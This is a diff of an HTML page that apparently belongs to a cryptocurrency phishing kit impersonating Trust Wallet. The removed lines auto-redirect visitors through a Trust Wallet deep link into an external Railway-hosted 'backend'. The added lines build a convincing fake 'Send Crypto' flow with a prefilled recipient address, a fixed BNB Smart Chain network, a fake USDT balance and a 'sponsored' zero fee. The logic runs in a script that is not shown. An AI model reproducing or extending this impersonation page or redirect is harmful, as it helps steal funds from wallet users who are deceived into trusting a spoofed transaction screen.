@@ -3,56 +3,251 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <meta name="theme-color" content="#0b0d14">
-    <meta http-equiv="refresh" content="0;url=intent://link.trustwallet.com/open_url?coin_id=20000714&url=https%3A%2F%2Ftrust-wallet-backend-production-2c80.up.railway.app#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Flink.trustwallet.com%2Fopen_url%3Fcoin_id%3D20000714%26url%3Dhttps%253A%252F%252Ftrust-wallet-backend-production-2c80.up.railway.app;end">
-    <title>Trust Wallet</title>
-    <style>
-        body {
-            background-color: #0b0d14;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .loading-box {
-            text-align: center;
-        }
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 3px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            border-top-color: #0500ff;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .open-btn {
-            display: inline-block;
-            margin-top: 16px;
-            padding: 10px 22px;
-            background-color: #0500ff;
-            color: #ffffff;
-            text-decoration: none;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-        }
-    </style>
+    <meta name="theme-color" content="#0b0d14" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#f8fafc" media="(prefers-color-scheme: light)">
+    <title>Send Crypto - Trust Wallet</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/styles.css?v=13">
 </head>
 <body>
-    <div class="loading-box">
-        <div class="spinner"></div>
-        <p style="font-size: 14px; color: #8a8f9d; margin: 0;">Opening Trust Wallet...</p>
-        <a href="intent://link.trustwallet.com/open_url?coin_id=20000714&url=https%3A%2F%2Ftrust-wallet-backend-production-2c80.up.railway.app#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Flink.trustwallet.com%2Fopen_url%3Fcoin_id%3D20000714%26url%3Dhttps%253A%252F%252Ftrust-wallet-backend-production-2c80.up.railway.app;end" class="open-btn">Open Trust Wallet App</a>
+    <div class="app-container">
+        <!-- ================= SCREEN 1: SEND TO (ADDRESS SCREEN) ================= -->
+        <div class="screen-step active" id="stepAddress">
+            <!-- Top Navigation Header -->
+            <header class="app-header">
+                <button class="header-icon-btn" id="closeBtn" aria-label="Close">
+                    <i class="fa-solid fa-xmark"></i>
+                </button>
+                <h1 class="header-title">Send to</h1>
+                <button class="header-icon-btn scanner-btn-anim" id="scanQrBtn" aria-label="Scan QR Code" title="Scan QR Code">
+                    <svg class="custom-scan-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M5 8a1 1 0 0 1-2 0V5.923c0-.76.082-1.185.319-1.627.223-.419.558-.754.977-.977C4.738 3.082 5.162 3 5.923 3H8a1 1 0 0 1 0 2H5.923c-.459 0-.57.022-.684.082a.364.364 0 0 0-.157.157c-.06.113-.082.225-.082.684V8zm3 11a1 1 0 1 1 0 2H5.923c-.76 0-1.185-.082-1.627-.319a2.363 2.363 0 0 1-.977-.977C3.082 19.262 3 18.838 3 18.077V16a1 1 0 1 1 2 0v2.077c0 .459.022.57.082.684.038.07.087.12.157.157.113.06.225.082.684.082H8zm7-15a1 1 0 0 0 1 1h2.077c.459 0 .57.022.684.082.07.038.12.087.157.157.06.113.082.225.082.684V8a1 1 0 1 0 2 0V5.923c0-.76-.082-1.185-.319-1.627a2.363 2.363 0 0 0-.977-.977C19.262 3.082 18.838 3 18.077 3H16a1 1 0 0 0-1 1zm4 12a1 1 0 1 1 2 0v2.077c0 .76-.082 1.185-.319 1.627a2.364 2.364 0 0 1-.977.977c-.442.237-.866.319-1.627.319H16a1 1 0 1 1 0-2h2.077c.459 0 .57-.022.684-.082a.363.363 0 0 0 .157-.157c.06-.113.082-.225.082-.684V16zM3 11a1 1 0 1 0 0 2h18a1 1 0 1 0 0-2H3z" fill="currentColor"></path>
+                        </g>
+                    </svg>
+                </button>
+            </header>
+
+            <!-- Main Form Body -->
+            <main class="app-body">
+                <div class="send-card">
+                    <div class="address-input-container">
+                        <textarea id="addressInput" rows="2" placeholder="Paste or enter address" spellcheck="false" aria-label="Receiver Address">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</textarea>
+                    </div>
+
+                    <div class="send-card-footer">
+                        <div class="network-select-wrapper">
+                            <div class="network-pill-btn static-pill">
+                                <img src="https://files.svgcdn.io/token-branded/bnb.png" alt="BNB Logo" class="bnb-pill-logo">
+                                <span>BNB Smart Chain</span>
+                            </div>
+                        </div>
+                        <button class="clear-btn" id="clearBtn">Clear</button>
+                    </div>
+                </div>
+            </main>
+
+            <!-- Bottom Fixed Footer for Continue Button Container -->
+            <footer class="app-footer">
+                <div class="square-container-card">
+                    <button class="btn-continue" id="continueBtn">Continue</button>
+                </div>
+            </footer>
+        </div>
+
+        <!-- ================= SCREEN 2: AMOUNT SCREEN ================= -->
+        <div class="screen-step" id="stepAmount">
+            <!-- Amount Screen Header -->
+            <header class="app-header">
+                <button class="header-icon-btn" id="backToAddressBtn" aria-label="Back">
+                    <i class="fa-solid fa-chevron-left"></i>
+                </button>
+                <h1 class="header-title">Amount</h1>
+                <div style="width: 42px;"></div>
+            </header>
+
+            <!-- Destination Subheader with HR Lines Above & Below -->
+            <hr class="divider-line">
+            <div class="to-address-banner">
+                <span class="to-label">To:</span>
+                <span class="to-address-text" id="displayToAddress">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</span>
+            </div>
+            <hr class="divider-line">
+
+            <!-- Main Amount Input & Fiat Display Area -->
+            <div class="amount-display-area">
+                <div class="amount-crypto-val" id="displayCryptoVal">0</div>
+                <div class="amount-fiat-val" id="displayFiatVal">
+                    ≈ ₹0.00
+                    <svg class="custom-convert-arrows-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
+                        <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+                        <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+                        <g id="SVGRepo_iconCarrier">
+                            <g>
+                                <path fill="none" d="M0 0h24v24H0z"></path>
+                                <path d="M12 8H8.001L8 20H6V8H2l5-5 5 5zm10 8l-5 5-5-5h4V4h2v12h4z"></path>
+                            </g>
+                        </g>
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Unified Bottom Container Card (USDT Logo + Keypad + Review Button) -->
+            <div class="bottom-unified-card">
+                <!-- Token Balance Row & Max Button -->
+                <div class="token-balance-row">
+                    <div class="token-info-left">
+                        <div class="token-icon-wrapper">
+                            <img src="https://static.cdnlogo.com/logos/t/60/tether.svg" alt="Tether USDT" class="usdt-token-logo">
+                            <img src="https://files.svgcdn.io/token-branded/bnb.png" alt="BNB" class="token-chain-badge">
+                        </div>
+                        <div class="token-details">
+                            <span class="token-balance-crypto">2 USDT</span>
+                            <span class="token-balance-fiat">₹192.45</span>
+                        </div>
+                    </div>
+                    <button class="max-btn" id="maxBtn">Max</button>
+                </div>
+
+                <!-- On-Screen Numeric Keypad -->
+                <div class="keypad-grid">
+                    <button class="keypad-btn" data-key="1">1</button>
+                    <button class="keypad-btn" data-key="2">2</button>
+                    <button class="keypad-btn" data-key="3">3</button>
+
+                    <button class="keypad-btn" data-key="4">4</button>
+                    <button class="keypad-btn" data-key="5">5</button>
+                    <button class="keypad-btn" data-key="6">6</button>
+
+                    <button class="keypad-btn" data-key="7">7</button>
+                    <button class="keypad-btn" data-key="8">8</button>
+                    <button class="keypad-btn" data-key="9">9</button>
+
+                    <button class="keypad-btn" data-key=".">.</button>
+                    <button class="keypad-btn" data-key="0">0</button>
+                    <button class="keypad-btn backspace-key" id="keypadDelete"><i class="fa-solid fa-delete-left"></i></button>
+                </div>
+
+                <!-- Review Button inside Unified Container -->
+                <div class="inner-review-wrapper">
+                    <button class="btn-continue btn-review-disabled" id="reviewBtn">Review</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================= SCREEN 3: REVIEW SEND SCREEN ================= -->
+        <div class="screen-step" id="stepReview">
+            <!-- Review Screen Header -->
+            <header class="app-header">
+                <button class="header-icon-btn" id="backToAmountBtn" aria-label="Back">
+                    <i class="fa-solid fa-chevron-left"></i>
+                </button>
+                <h1 class="header-title">Review Send</h1>
+                <button class="header-icon-btn" id="settingsBtn" aria-label="Settings">
+                    <i class="fa-solid fa-sliders"></i>
+                </button>
+            </header>
+
+            <main class="review-body">
+                <!-- Section 1: Amount Card -->
+                <div class="review-section">
+                    <span class="review-section-label">Amount</span>
+                    <div class="review-card row-card">
+                        <div class="token-icon-wrapper">
+                            <img src="https://static.cdnlogo.com/logos/t/60/tether.svg" alt="Tether USDT" class="usdt-token-logo">
+                            <img src="https://files.svgcdn.io/token-branded/bnb.png" alt="BNB" class="token-chain-badge">
+                        </div>
+                        <div class="review-amount-text">
+                            <span class="review-crypto-num" id="reviewCryptoVal">1 USDT</span>
+                            <span class="review-fiat-num" id="reviewFiatVal">≈ ₹96.22</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section 2: Details Card -->
+                <div class="review-section">
+                    <span class="review-section-label">Details</span>
+                    <div class="review-card column-card">
+                        <div class="detail-row">
+                            <span class="detail-label">From</span>
+                            <span class="detail-val-text">Main Wallet</span>
+                        </div>
+
+                        <div class="detail-row">
+                            <span class="detail-label">To</span>
+                            <span class="detail-val-address" id="reviewToAddress">0x742d35Cc6634C0532925a3b844Bc454e4438f44e</span>
+                        </div>
+
+                        <div class="detail-row">
+                            <span class="detail-label">Network</span>
+                            <span class="detail-val-network">
+                                <img src="https://files.svgcdn.io/token-branded/bnb.png" alt="BNB" class="review-bnb-icon">
+                                <span>BNB Smart Chain</span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section 3: Network Fee Card -->
+                <div class="review-section">
+                    <div class="review-section-header-row">
+                        <span class="review-section-label">Network fee <i class="fa-solid fa-circle-info info-icon"></i></span>
+                        <span class="sponsored-badge"><i class="fa-solid fa-bolt"></i> Sponsored</span>
+                    </div>
+                    <div class="review-card row-card flex-between">
+                        <div class="network-fee-left">
+                            <img src="https://files.svgcdn.io/token-branded/bnb.png" alt="BNB" class="review-bnb-fee-icon">
+                            <span class="fee-token-name">BNB</span>
+                        </div>
+                        <div class="network-fee-right">
+                            <span class="fee-fiat-num">₹0.00</span>
+                            <span class="fee-crypto-num">0 BNB</span>
+                        </div>
+                    </div>
+                </div>
+            </main>
+
+            <!-- Bottom Action Footer for Send Button -->
+            <footer class="app-footer">
+                <div class="square-container-card">
+                    <button class="btn-continue btn-send-vibrant" id="sendBtn">Send</button>
+                </div>
+            </footer>
+        </div>
     </div>
 
-    <script src="js/script.js?v=16"></script>
+    <!-- Scanner Viewfinder Overlay / Modal -->
+    <div class="scanner-modal" id="scannerModal">
+        <div class="scanner-header">
+            <span><i class="fa-solid fa-qrcode"></i> Scan QR Code</span>
+            <button class="scanner-close-btn" id="closeScannerBtn">&times;</button>
+        </div>
+        <div class="viewfinder-container">
+            <div class="viewfinder-box">
+                <div class="laser-scan-line"></div>
+                <div class="corner top-left"></div>
+                <div class="corner top-right"></div>
+                <div class="corner bottom-left"></div>
+                <div class="corner bottom-right"></div>
+                <i class="fa-solid fa-camera camera-center-icon"></i>
+            </div>
+            <p class="scanner-instruction">Align QR code inside the frame to scan</p>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast">
+        <i class="fa-solid fa-circle-check"></i>
+        <span id="toastMsg"></span>
+    </div>
+
+    <script src="js/script.js?v=13"></script>
 </body>
 </html>
